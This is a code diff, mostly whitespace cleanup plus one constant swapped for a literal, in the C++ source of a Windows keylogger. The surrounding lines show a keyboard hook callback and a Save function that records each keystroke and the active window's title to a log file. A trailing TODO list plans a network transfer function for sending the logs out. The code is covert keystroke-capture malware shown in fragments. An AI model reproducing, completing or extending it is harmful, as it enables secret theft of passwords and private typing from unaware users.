@@ -24,7 +24,7 @@ std::ofstream OUTPUT_FILE;
 
 /*extern*/ char lastwindow[256];
 
-// This is the callback function. Consider it the event that is raised when, in this case, 
+// This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -72,7 +72,7 @@ int Save(int key_stroke)
 	HWND foreground = GetForegroundWindow();
 	DWORD threadID;
 	HKL layout = NULL;
-	if (foreground) 
+	if (foreground)
 	{
 		//get keyboard layout of the thread
 		threadID = GetWindowThreadProcessId(foreground, NULL);
@@ -85,7 +85,7 @@ int Save(int key_stroke)
 		GetWindowText(foreground, window_title, 256);
 
 		//if lastwindow title is not the same as current window_title
-		if (strcmp(window_title, lastwindow) != 0) 
+		if (strcmp(window_title, lastwindow) != 0)
 		{
 			strcpy(lastwindow, window_title);
 
@@ -133,7 +133,7 @@ int Save(int key_stroke)
 		OUTPUT_FILE << "-";
 	else if (key_stroke == 20)
 		OUTPUT_FILE << "[CAPSLOCK]";
-	else 
+	else
 	{
 		char key;
 		// check caps lock
@@ -144,8 +144,8 @@ int Save(int key_stroke)
 			lowercase = !lowercase;
 		}
 
-		//map virtual key according to keyboard layout 
-		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+		//map virtual key according to keyboard layout
+		key = MapVirtualKeyExA(key_stroke, 2, layout);
 
 		//tolower converts it to lowercase properly
 		if (!lowercase) key = tolower(key);
@@ -191,5 +191,5 @@ int main()
 	add a better format for the log
 	add network transfer function
 	add a new line when enter key pressed
-	keep 
+	keep
 */
